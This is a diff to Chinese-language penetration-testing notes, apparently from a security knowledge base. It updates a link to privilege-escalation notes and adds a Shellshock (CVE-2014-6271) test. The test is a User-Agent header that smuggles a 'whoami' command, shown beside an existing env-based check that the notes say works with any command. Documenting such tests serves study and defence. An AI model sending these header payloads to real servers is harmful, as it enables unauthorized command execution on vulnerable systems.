@@ -27,7 +27,7 @@
 # 漏洞利用
 ## 提权
 
-关于 linux 更多提权内容,见笔记 [提权](./提权.md#linux) linux 提权部分
+关于 linux 更多提权内容,见笔记 [权限提升](./后渗透/权限提升.md#linux) linux 提权部分
 
 ---
 
@@ -52,6 +52,8 @@
     `env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"`
 
     执行命令后,如果显示 Vulnerable CVE-2014-6271,证系统存在漏洞,可改变 echo Vulnerable CVE-2014-6271 为任意命令进行执行.
+
+    `User-Agent: () { :;}; whoami`
 
 - MSF 模块
     ```bash
